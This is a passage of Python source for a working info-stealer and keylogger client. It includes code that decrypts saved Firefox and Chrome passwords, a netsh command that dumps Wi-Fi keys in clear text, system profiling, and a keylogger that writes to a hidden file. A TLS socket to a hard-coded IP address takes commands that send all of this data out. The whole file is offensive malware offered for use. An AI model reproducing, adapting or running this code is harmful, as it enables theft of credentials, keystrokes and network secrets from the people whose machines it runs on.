        parser.add_argument(
            "-c",
            "--choice",
            help="The profile to use (starts with 1). If only one profile, defaults to that.",
        )
        parser.add_argument(
            "-l", "--list", action="store_true", help="List profiles and exit."
        )
        parser.add_argument(
            "-e",
            "--encoding",
            action="store",
            default=DEFAULT_ENCODING,
            help="Override default encoding (%(default)s).",
        )
        parser.add_argument(
            "-v",
            "--verbose",
            action="count",
            default=0,
            help="Verbosity level. Warning on -vv (highest level) user input will be printed on screen",
        )
        parser.add_argument(
            "--version",
            action="version",
            version=firefox.__version__,
            help="Display version of firefox_decrypt and exit",
        )
        args = parser.parse_args()
        # understand `\t` as tab character if specified as delimiter.
        if args.csv_delimiter == "\\t":
            args.csv_delimiter = "\t"
        return args

    @staticmethod
    def setup_logging(args) -> None:
        """Setup the logging level and configure the basic logger"""
        if args.verbose == 1:
            level = logging.INFO
        elif args.verbose >= 2:
            level = logging.DEBUG
        else:
            level = logging.WARN
        logging.basicConfig(
            format="%(asctime)s - %(levelname)s - %(message)s",
            level=level,
        )
        global LOG
        LOG = logging.getLogger(__name__)

    @staticmethod
    def identify_system_locale() -> str:
        encoding: Optional[str] = locale.getpreferredencoding()
        if encoding is None:
            LOG.error(
                "Could not determine which encoding/locale to use for NSS interaction. "
                "This configuration is unsupported.\n"
                "If you are in Linux or MacOS, please search online "
                "how to configure a UTF-8 compatible locale and try again."
            )
            raise firefox.Exit(firefox.Exit.BAD_LOCALE)
        return encoding

    @staticmethod
    def init() -> PWStore:
        """Main entry point"""
        args = firefox.parse_sys_args()
        firefox.setup_logging(args)
        global DEFAULT_ENCODING
        if args.encoding != DEFAULT_ENCODING:
            LOG.info(
                "Overriding default encoding from '%s' to '%s'",
                DEFAULT_ENCODING,
                args.encoding,
            )
            # Override default encoding if specified by user
            DEFAULT_ENCODING = args.encoding
        LOG.info("Running firefox_decrypt version: %s", firefox.__version__)
        LOG.debug("Parsed commandline arguments: %s", args)
        encodings = (
            ("stdin", sys.stdin.encoding),
            ("stdout", sys.stdout.encoding),
            ("stderr", sys.stderr.encoding),
            ("locale", firefox.identify_system_locale()),
        )
        LOG.debug(
            "Running with encodings: %s: %s, %s: %s, %s: %s, %s: %s", *chain(*encodings)
        )
        for stream, encoding in encodings:
            if encoding.lower() != DEFAULT_ENCODING:
                LOG.warning(
                    "Running with unsupported encoding '%s': %s"
                    " - Things are likely to fail from here onwards",
                    stream,
                    encoding,
                )
        # Load Mozilla profile and initialize NSS before asking the user for input
        moz = firefox.MozillaInteraction(args.non_fatal_decryption)
        basepath = os.path.expanduser(args.profile)
        # Read profiles from profiles.ini in profile folder
        profile = firefox.get_profile(basepath, args.interactive, args.choice, args.list)
        # Start NSS for selected profile
        moz.load_profile(profile)
        # Check if profile is password protected and prompt for a password
        moz.authenticate(args.interactive)
        # Decode all passwords
        outputs = moz.decrypt_passwords()
        # Finally shutdown NSS
        moz.unload_profile()
        return outputs

    def run_ffdecrypt():
        try:
            return firefox.init()
        except KeyboardInterrupt:
            print("Quit.")
            sys.exit(firefox.Exit.KEYBOARD_INTERRUPT)
        except firefox.Exit as e:
            sys.exit(e.exitcode)
class Chrome:
    def chrome_date_and_time(self, chrome_data):
        return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)

    def fetching_encryption_key(self):
        local_computer_directory_path = os.path.join(
            os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome",
            "User Data", "Local State")
        
        with open(local_computer_directory_path, "r", encoding="utf-8") as f:
            local_state_data = f.read()
            local_state_data = json.loads(local_state_data)

        encryption_key = base64.b64decode(
            local_state_data["os_crypt"]["encrypted_key"])
        
        encryption_key = encryption_key[5:]
        return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

    def password_decryption(self, password, encryption_key):
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return "No Passwords"

    def init_chrome(self):
        key = self.fetching_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Google", "Chrome", "User Data", "default", "Login Data")
        filename = "ChromePasswords.db"
        shutil.copyfile(db_path, filename)
        
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        
        cursor.execute(
            "SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins "
            "ORDER BY date_last_used")
        
        outputs = []

        for row in cursor.fetchall():
            main_url = row[0]
            login_page_url = row[1]
            user_name = row[2]
            decrypted_password = self.password_decryption(row[3], key)
            date_of_creation = row[4]
            last_usage = row[5]
            
            entry = {
                "main_url": main_url,
                "login_page_url": login_page_url,
                "user_name": user_name,
                "decrypted_password": decrypted_password,
                "creation_date": None,
                "last_used": None
            }
            
            if date_of_creation != 86400000000 and date_of_creation:
                entry["creation_date"] = str(self.chrome_date_and_time(date_of_creation))
            
            if last_usage != 86400000000 and last_usage:
                entry["last_used"] = str(self.chrome_date_and_time(last_usage))
            
            outputs.append(entry)
        
        cursor.close()
        db.close()
        
        try:
            os.remove(filename)
        except:
            pass

        return outputs

def send_hidden_file(conn, filename, os_local):
    if os_local == 'windows':
        os.system(f"attrib -h {filename}")
    elif os_local == 'linux':
        if filename.startswith('.'):
            new_filename = filename[1:]
            os.rename(filename, new_filename)
            filename = new_filename

    # Send the file
    with open(filename, 'rb') as f:
        while True:
            chunk = f.read(1024)
            if not chunk:
                break
            conn.sendall(chunk)

    # Re-hide the file after sending
    if os_local == 'windows':
        os.system(f"attrib +h {filename}")
    elif os_local == 'linux':
        if filename.startswith('hidden_'):
            new_filename = '.' + filename
            os.rename(filename, new_filename)

def save_command_result(output_file):
    #for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear
    command = 'for /f "skip=9 tokens=1,2 delims=:" %i in (\'netsh wlan show profiles\') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear'
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
    output, error = process.communicate()
    if error:
        print("An error occurred:", error)
    else:
        with open(output_file, 'w') as f:
            f.write(output)

def check_platform():
    return platform.system()

def find_ca_cert_path():
    for r, d, files in os.walk("c:\\"):
        for filename in files:
            if filename == "ca-cert.pem":
                path = os.path.join(r, filename)
                if path.endswith("SSL\\CA\\ca-cert.pem"):
                    return path
    return None

def os_check():
    current_platform = check_platform()
    if current_platform == 'Windows':
        return 'Windows'
    elif current_platform == 'Linux':
        return 'Linux'
    else:
        return None

def delete_hidden_file(file):
    os.remove(file)

def send_data(conn, data):
    serialized_data = pickle.dumps(data)
    while serialized_data:
        conn.sendall(serialized_data[:10024])
        serialized_data = serialized_data[10024:]

def send_file(conn, filename):
    with open(filename, 'rb') as f:
        while True:
            chunk = f.read(1024)
            if not chunk:
                break
            conn.sendall(chunk)

def get_windows_info():
    try:
        # Get system info
        system_info = platform.uname()
        username = os.getlogin()
        os_version = platform.version()
        ram_info = psutil.virtual_memory()
        cpu_info = platform.processor()
        ip_address = socket.gethostbyname(socket.gethostname())
        boot_time = datetime.fromtimestamp(psutil.boot_time())
        
        # Collect system info
        info = {
            "System Information": {
                "Username": username,
                "System": system_info.system,
                "Node Name": system_info.node,
                "Release": system_info.release,
                "Version": os_version,
                "Machine": system_info.machine,
                "Processor": cpu_info,
                "IP Address": ip_address,
                "Boot Time": boot_time.strftime("%Y-%m-%d %H:%M:%S")
            },
            "RAM Information": {
                "Total": f"{ram_info.total / (1024 ** 3):.2f} GB",
                "Available": f"{ram_info.available / (1024 ** 3):.2f} GB",
                "Used": f"{ram_info.used / (1024 ** 3):.2f} GB",
                "Percentage": f"{ram_info.percent}%"
            },
            "Disk Information": [],
            "Network Information": []
        }
        
        # Collect disk info
        partitions = psutil.disk_partitions()
        for partition in partitions:
            partition_info = {
                "Device": partition.device,
                "Mountpoint": partition.mountpoint,
                "File system type": partition.fstype
            }
            try:
                partition_usage = psutil.disk_usage(partition.mountpoint)
                partition_info.update({
                    "Total Size": f"{partition_usage.total / (1024 ** 3):.2f} GB",
                    "Used": f"{partition_usage.used / (1024 ** 3):.2f} GB",
                    "Free": f"{partition_usage.free / (1024 ** 3):.2f} GB",
                    "Percentage": f"{partition_usage.percent}%"
                })
            except PermissionError:
                partition_info["Error"] = "Permission Denied"
            info["Disk Information"].append(partition_info)
                
        # Collect network info
        if_addrs = psutil.net_if_addrs()
        for interface_name, interface_addresses in if_addrs.items():
            for address in interface_addresses:
                address_info = {"Interface": interface_name}
                if str(address.family) == 'AddressFamily.AF_INET':
                    address_info.update({
                        "IP Address": address.address,
                        "Netmask": address.netmask,
                        "Broadcast IP": address.broadcast
                    })
                elif str(address.family) == 'AddressFamily.AF_PACKET':
                    address_info.update({
                        "MAC Address": address.address,
                        "Netmask": address.netmask,
                        "Broadcast MAC": address.broadcast
                    })
                info["Network Information"].append(address_info)
        
        return info

    except Exception as e:
        return {"Error": str(e)}




def key_logger(hidden_file_path, client_ssl, os_local):
    logging.basicConfig(filename=hidden_file_path, level=logging.DEBUG, format="%(asctime)s - %(message)s")
    if os_local == 'windows':
        os.system(f"attrib +h {hidden_file_path}")
    elif os_local == 'linux':
        hidden_file_path = '.' + hidden_file_path

    def on_press(key):
        logging.info(str(key))

    with Listener(on_press=on_press) as listener:
        server_listener_thread = threading.Thread(target=listen_to_server, args=(client_ssl,))
        server_listener_thread.start()
        server_listener_thread.join()
        send_hidden_file(client_ssl, "its_a_trap.txt", os_local)
        listener.stop()
        
        client_ssl.close()
        logging.shutdown()
        delete_hidden_file("its_a_trap.txt")

        exit(1)

def listen_to_server(client_ssl):
    while True:
        msg = client_ssl.recv(1024).decode()
        print(f"Server : {msg}")
        if msg == "STOP":
            print("stop")
            send_file(client_ssl, "its_a_trap.txt")
            #delete_hidden_file("its_a_trap.txt")
            exit(1)
        if msg == "WIFI":
            output_file = 'result.txt'
            save_command_result(output_file)
            send_file(client_ssl, output_file)
            delete_hidden_file(output_file)
            exit(1)
        if msg == "SURF":
            chrome_instance = Chrome()
            chrome_data = chrome_instance.init_chrome()
            firefox_data = firefox.run_ffdecrypt()

            with open("its_a_trap.txt", 'r') as f:
                file_contents = f.read()
                
            naviguator_data = {
                "chrome_data": chrome_data,
                "firefox_data": firefox_data,
                "file_contents": file_contents
            }

            send_data(client_ssl, naviguator_data)
            get_windows_info()
            exit(1)
        if msg == "ALL":
            chrome_instance = Chrome()
            chrome_data = chrome_instance.init_chrome()
            firefox_data = firefox.run_ffdecrypt()
            output_file = 'result.txt'
            save_command_result(output_file)
            
            with open("its_a_trap.txt", 'r') as f:
                file_contents_keyloggger = f.read()

            with open(output_file, 'r') as f:
                file_contents_wifi = f.read()
                
            system_info = get_windows_info()
            naviguator_data = {
                "chrome_data": chrome_data,
                "firefox_data": firefox_data,
                "keylogger": file_contents_keyloggger,
                "wifi" : file_contents_wifi,
                "system_info" : system_info,
            }
            send_data(client_ssl,naviguator_data)
            delete_hidden_file(output_file)
            exit(1)


def timeout_handler(client_ssl):
    print("Connection timed out after 10 minutes.")
    client_ssl.close()


def main():
    os_local = os_check()
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.load_verify_locations(cadata=CA_CERTIFICATE)
    host = '192.168.1.20'
    port = 10
    socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_ssl = context.wrap_socket(socket_obj, server_hostname=host)
    client_ssl.connect((host, port))
    print("Client ON")

    while True:
        try:
            key_logger("its_a_trap.txt", client_ssl,os_local)

        except Exception as e:
            print(f"Error: {e}")
            break

        print("-- END --")
        client_ssl.close()


if __name__ == "__main__":
    main()